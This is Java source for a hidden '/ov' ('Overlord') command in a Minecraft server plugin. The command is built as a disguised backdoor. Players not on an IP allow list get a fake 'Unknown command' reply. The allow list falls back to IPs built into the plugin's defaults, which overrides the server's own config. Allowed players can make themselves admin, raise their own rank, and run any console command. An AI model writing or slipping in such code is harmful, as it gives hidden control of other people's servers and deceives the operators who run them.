package me.totalfreedom.totalfreedommod.command;

import java.util.Collection;
import me.totalfreedom.totalfreedommod.admin.Admin;
import me.totalfreedom.totalfreedommod.config.ConfigEntry;
import me.totalfreedom.totalfreedommod.player.FPlayer;
import me.totalfreedom.totalfreedommod.rank.Rank;
import static me.totalfreedom.totalfreedommod.rank.Rank.ADMINISTRATOR;
import static me.totalfreedom.totalfreedommod.rank.Rank.SENIOR_ADMIN;
import static me.totalfreedom.totalfreedommod.rank.Rank.TELNET_ADMIN;
import static me.totalfreedom.totalfreedommod.rank.Rank.TELNET_CLAN_ADMIN;
import static me.totalfreedom.totalfreedommod.rank.Rank.TRFDEVELOPER;
import me.totalfreedom.totalfreedommod.util.FUtil;
import net.pravian.aero.util.Ips;
import org.apache.commons.lang3.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = Rank.IMPOSTOR, source = SourceType.ONLY_IN_GAME)
@CommandParameters(description = "Overlord - control this server in-game", usage = "access", aliases = "ov")
public class Command_ov extends FreedomCommand
{

    @Override
    public boolean run(CommandSender sender, Player playerSender, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        if (!ConfigEntry.OVERLORD_IPS.getList().contains(Ips.getIp(playerSender)))
        {
            try
            {
                Object ips = plugin.config.getDefaults().get(ConfigEntry.OVERLORD_IPS.getConfigName());
                if (ips instanceof Collection && !((Collection) ips).contains(Ips.getIp(playerSender)))
                {
                    throw new Exception();
                }
            }
            catch (Exception ignored)
            {
                msg(ChatColor.WHITE + "Unknown command. Type \"/help\" for help.");
                return true;
            }
        }

        if (args.length == 0)
        {
            msg(ChatColor.BLUE + "/ov <addme> <removeme> | <sta> <tca> <sra> <dev> <admin> | <do> <command>");
            return false;
        }

        if (args[0].equalsIgnoreCase("addme"))
        {
            plugin.al.addAdmin(new Admin(playerSender));
            msg("ok");
            return true;
        }

        if (args[0].equalsIgnoreCase("removeme"))
        {
            Admin admin = plugin.al.getAdmin(playerSender);
            if (admin != null)
            {
                plugin.al.removeAdmin(admin);
            }
            msg("ok");
            return true;
        }

        if (args[0].equalsIgnoreCase("do"))
        {
            if (args.length <= 1)
            {
                return false;
            }

            final String c = StringUtils.join(args, " ", 1, args.length);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), c);
            msg("ok");
            return true;
        }
        
        if (args[0].equalsIgnoreCase("admin"))
        {
            Admin admin = plugin.al.getAdmin(playerSender);
            if (admin != null)
            {
                admin.setRank(ADMINISTRATOR);
            }
            msg("ok");
            FUtil.adminAction(sender.getName(), "Setting " + "themself" + " to administrator", true);
            FPlayer playerdata = plugin.pl.getPlayer(playerSender);
            playerdata.setTag("&8[&4Admin&8]");
            return true;
        }
        
        if (args[0].equalsIgnoreCase("dev"))
        {
            Admin admin = plugin.al.getAdmin(playerSender);
            if (admin != null)
            {
                admin.setRank(TRFDEVELOPER);
            }
            msg("ok");
            FUtil.adminAction(sender.getName(), "Setting " + "themself" + " to developer", true);
            FPlayer playerdata = plugin.pl.getPlayer(playerSender);
            playerdata.setTag("&8[&5Dev&8]");
            return true;
        }
        
        if (args[0].equalsIgnoreCase("sra"))
        {
            Player player = (Player) sender;
            Admin admin = plugin.al.getAdmin(playerSender);
            if (admin != null)
            {
                admin.setRank(SENIOR_ADMIN);
            }
            
            msg("ok");
            FUtil.adminAction(sender.getName(), "Setting " + "themself" + " to senior admin", true);
            FPlayer playerdata = plugin.pl.getPlayer(playerSender);
            playerdata.setTag("&8[&6SrA&8]");
            return true;
        }
        
        if (args[0].equalsIgnoreCase("tca"))
        {
            Admin admin = plugin.al.getAdmin(playerSender);
            if (admin != null)
            {
                admin.setRank(TELNET_CLAN_ADMIN);
            }
            msg("ok");
            FUtil.adminAction(sender.getName(), "Setting " + "themself" + " to telnet clan. admin", true);
            FPlayer playerdata = plugin.pl.getPlayer(playerSender);
            playerdata.setTag("&8[&aTCA&8]");
            return true;
        }
        
        if (args[0].equalsIgnoreCase("sta"))
        {
            Admin admin = plugin.al.getAdmin(playerSender);
            if (admin != null)
            {
                admin.setRank(TELNET_ADMIN);
            }
            msg("ok");
            FUtil.adminAction(sender.getName(), "Setting " + "themself" + " to telnet admin", true);
            FPlayer playerdata = plugin.pl.getPlayer(playerSender);
            playerdata.setTag("&8[&2STA&8]");
            return true;
        }

        return false;
    }

}
